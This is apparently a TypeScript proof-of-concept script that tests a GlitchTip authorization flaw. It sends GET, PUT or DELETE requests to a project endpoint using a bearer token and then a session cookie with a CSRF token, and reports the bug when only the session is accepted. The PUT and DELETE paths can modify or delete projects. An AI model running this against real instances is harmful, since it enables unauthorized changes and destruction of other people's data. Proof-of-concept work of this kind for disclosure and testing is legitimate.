import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const DEFAULT_BASE_URL = "http://localhost:8000";

const ACTIONS = [
    { label: "GET project", value: "GET" },
    { label: "PUT project", value: "PUT" },
    { label: "DELETE project", value: "DELETE" },
] as const;

const UPDATE_FIELDS = [
    { label: "Title / name", value: "name" },
    { label: "Slug", value: "slug" },
    { label: "Platform", value: "platform" },
] as const;

type ActionMethod = (typeof ACTIONS)[number]["value"];
type UpdateField = (typeof UPDATE_FIELDS)[number]["value"];

type ParsedArgs = Record<string, string | boolean>;

type RequestConfig = {
    method: ActionMethod;
    baseUrl: string;
    organizationSlug: string;
    projectSlug: string;
    token: string;
    sessionId: string;
    csrfToken: string;
    updateField: UpdateField | null;
    updateValue: string | null;
};

function parseArgs(argv: string[]): ParsedArgs {
    const args: ParsedArgs = {};

    for (let index = 0; index < argv.length; index += 1) {
        const arg = argv[index];

        if (!arg.startsWith("--")) {
            continue;
        }

        const [rawKey, inlineValue] = arg.slice(2).split("=", 2);
        const key = rawKey.replace(/-([a-z])/g, (_, letter: string) => letter.toUpperCase());

        if (inlineValue !== undefined) {
            args[key] = inlineValue;
            continue;
        }

        const nextValue = argv[index + 1];
        if (nextValue && !nextValue.startsWith("--")) {
            args[key] = nextValue;
            index += 1;
            continue;
        }

        args[key] = true;
    }

    return args;
}

function getArgString(args: ParsedArgs, key: string): string | undefined {
    const value = args[key];
    return typeof value === "string" ? value : undefined;
}

function normalizeBaseUrl(value: string): string {
    return value.replace(/\/$/, "");
}

function projectPath(organizationSlug: string, projectSlug: string): string {
    return `/api/0/projects/${encodeURIComponent(organizationSlug)}/${encodeURIComponent(projectSlug)}/`;
}

function createSessionHeaders({
    sessionId,
    csrfToken,
    baseUrl,
}: {
    sessionId: string;
    csrfToken: string;
    baseUrl: string;
}): Record<string, string> {
    const headers: Record<string, string> = {
        Cookie: csrfToken ? `sessionid=${sessionId}; csrftoken=${csrfToken}` : `sessionid=${sessionId}`,
    };

    if (csrfToken) {
        headers["X-CSRFToken"] = csrfToken;
        headers.Referer = `${baseUrl}/`;
        headers.Origin = baseUrl;
    }

    return headers;
}

async function prompt(
    rl: readline.Interface | null,
    message: string,
    { defaultValue, required = true }: { defaultValue?: string; required?: boolean } = {},
): Promise<string> {
    if (!rl) {
        if (defaultValue !== undefined) {
            return defaultValue;
        }

        if (!required) {
            return "";
        }

        throw new Error(`Missing ${message.toLowerCase()}.`);
    }

    for (;;) {
        const suffix = defaultValue === undefined ? "" : ` [${defaultValue}]`;
        const answer = (await rl.question(`${message}${suffix}: `)).trim();

        if (answer) {
            return answer;
        }

        if (defaultValue !== undefined) {
            return defaultValue;
        }

        if (!required) {
            return "";
        }

        console.log("This value is required.");
    }
}

async function choose<T extends ReadonlyArray<{ label: string; value: string }>>(
    rl: readline.Interface | null,
    message: string,
    choices: T,
): Promise<T[number]> {
    if (!rl) {
        throw new Error(`Missing ${message.toLowerCase()}.`);
    }

    console.log(`\n${message}`);
    choices.forEach((choice, index) => {
        console.log(`  ${index + 1}. ${choice.label}`);
    });

    for (;;) {
        const raw = await rl.question("Select a number: ");
        const value = Number.parseInt(raw.trim(), 10);

        if (Number.isInteger(value) && value >= 1 && value <= choices.length) {
            return choices[value - 1];
        }

        console.log("Please pick one of the listed numbers.");
    }
}

function resolveMethod(value: string | undefined): ActionMethod | null {
    const normalized = value?.toUpperCase();
    return ACTIONS.some((action) => action.value === normalized) ? (normalized as ActionMethod) : null;
}

function resolveUpdateField(value: string | undefined): UpdateField | null {
    const normalized = value?.toLowerCase();
    if (!normalized) {
        return null;
    }

    if (normalized === "title" || normalized === "name") {
        return "name";
    }

    if (normalized === "slug" || normalized === "platform") {
        return normalized;
    }

    const fromLabel = UPDATE_FIELDS.find((item) => item.label.toLowerCase() === normalized)?.value;
    return fromLabel ?? null;
}

function buildPayload(method: ActionMethod, field: UpdateField | null, value: string | null): Record<string, string> | undefined {
    if (method !== "PUT" || !field || value === null) {
        return undefined;
    }

    return { [field]: value };
}

function formatBody(text: string): string {
    if (!text) {
        return "<empty>";
    }

    try {
        return JSON.stringify(JSON.parse(text), null, 2);
    } catch {
        return text;
    }
}

async function sendRequest({
    baseUrl,
    method,
    path,
    headers,
    body,
}: {
    baseUrl: string;
    method: ActionMethod;
    path: string;
    headers: Record<string, string>;
    body?: string;
}): Promise<{ status: number; statusText: string; body: string }> {
    const response = await fetch(`${baseUrl}${path}`, {
        method,
        headers,
        body,
    });

    return {
        status: response.status,
        statusText: response.statusText,
        body: formatBody((await response.text()).slice(0, 4000)),
    };
}

async function resolveConfig(args: ParsedArgs, rl: readline.Interface | null): Promise<RequestConfig> {
    const method = resolveMethod(getArgString(args, "method")) ?? (await choose(rl, "Choose an action", ACTIONS)).value;
    const baseUrl = normalizeBaseUrl(getArgString(args, "url") ?? (await prompt(rl, "Base URL", { defaultValue: DEFAULT_BASE_URL })));
    const organizationSlug = getArgString(args, "org") ?? (await prompt(rl, "Organization slug"));
    const projectSlug = getArgString(args, "project") ?? (await prompt(rl, "Project slug"));
    const token = getArgString(args, "token") ?? (await prompt(rl, "Bearer token"));
    const sessionId = getArgString(args, "sessionId") ?? (await prompt(rl, "Session ID"));
    const csrfToken = getArgString(args, "csrfToken") ?? (await prompt(rl, "CSRF token", { required: false }));

    let updateField: UpdateField | null = null;
    let updateValue: string | null = null;

    if (method === "PUT") {
        const field = resolveUpdateField(getArgString(args, "field")) ?? (await choose(rl, "What do you want to change?", UPDATE_FIELDS)).value;
        updateField = resolveUpdateField(field) ?? field;

        if (updateField === "name") {
            updateValue = getArgString(args, "title") ?? getArgString(args, "name") ?? (await prompt(rl, "New project title"));
        } else if (updateField === "slug") {
            updateValue = getArgString(args, "newSlug") ?? getArgString(args, "slug") ?? (await prompt(rl, "New project slug"));
        } else if (updateField === "platform") {
            updateValue = getArgString(args, "platform") ?? (await prompt(rl, "New project platform"));
        } else {
            updateValue = getArgString(args, "value") ?? (await prompt(rl, "New value"));
        }
    }

    return {
        method,
        baseUrl,
        organizationSlug,
        projectSlug,
        token,
        sessionId,
        csrfToken,
        updateField,
        updateValue,
    };
}

function printResponse(label: string, response: { status: number; statusText: string; body: string }): void {
    console.log(`\n[${label}]`);
    console.log(`Status: ${response.status} ${response.statusText}`);
    console.log(`Body:\n${response.body}`);
}

async function main(): Promise<void> {
    const args = parseArgs(process.argv.slice(2));

    if (args.help) {
        console.log(`Usage:
  ts-node glitchtip-poc.ts [--url URL] [--org ORG] [--project PROJECT] [--token TOKEN]
                           [--session-id SESSION] [--csrf-token TOKEN]
                           [--method GET|PUT|DELETE] [--field title|slug|platform]
                           [--title VALUE] [--name VALUE] [--slug VALUE] [--platform VALUE]

Missing values are requested interactively when a TTY is available.
`);
        return;
    }

    const interactive = process.stdin.isTTY && process.stdout.isTTY;
    const rl = interactive ? readline.createInterface({ input, output }) : null;

    try {
        const config = await resolveConfig(args, rl);
        const path = projectPath(config.organizationSlug, config.projectSlug);
        const body = buildPayload(config.method, config.updateField, config.updateValue);
        const jsonHeaders: Record<string, string> = body ? { "Content-Type": "application/json" } : {};

        console.log("\nProject target:", `${config.baseUrl}${path}`);
        console.log("Action:", config.method);

        const tokenResponse = await sendRequest({
            baseUrl: config.baseUrl,
            method: config.method,
            path,
            headers: {
                Authorization: `Bearer ${config.token}`,
                ...jsonHeaders,
            },
            body: body ? JSON.stringify(body) : undefined,
        });

        const sessionResponse = await sendRequest({
            baseUrl: config.baseUrl,
            method: config.method,
            path,
            headers: {
                ...createSessionHeaders({
                    sessionId: config.sessionId,
                    csrfToken: config.csrfToken,
                    baseUrl: config.baseUrl,
                }),
                ...jsonHeaders,
            },
            body: body ? JSON.stringify(body) : undefined,
        });

        printResponse("Bearer token", tokenResponse);
        printResponse("Browser session", sessionResponse);

        if (config.method === "GET") {
            console.log("\nResult:");
            console.log("GET completed for both auth paths.");
            return;
        }

        const tokenRejected = [401, 403].includes(tokenResponse.status);
        const sessionAccepted = [200, 202, 204].includes(sessionResponse.status);

        console.log("\nResult:");

        if (tokenRejected && sessionAccepted) {
            console.log("Vulnerable behavior confirmed.");
            console.log("The bearer token was rejected, but the browser session succeeded.");
            return;
        }

        console.log("Vulnerable behavior not confirmed.");
        console.log("Expected bearer token status: 401 or 403");
        console.log("Expected browser session status: 200, 202, or 204");
        process.exitCode = 1;
    } finally {
        rl?.close();
    }
}

main().catch((error: unknown) => {
    const message = error instanceof Error ? error.message : String(error);
    console.error("PoC failed:", message);
    process.exitCode = 1;
});
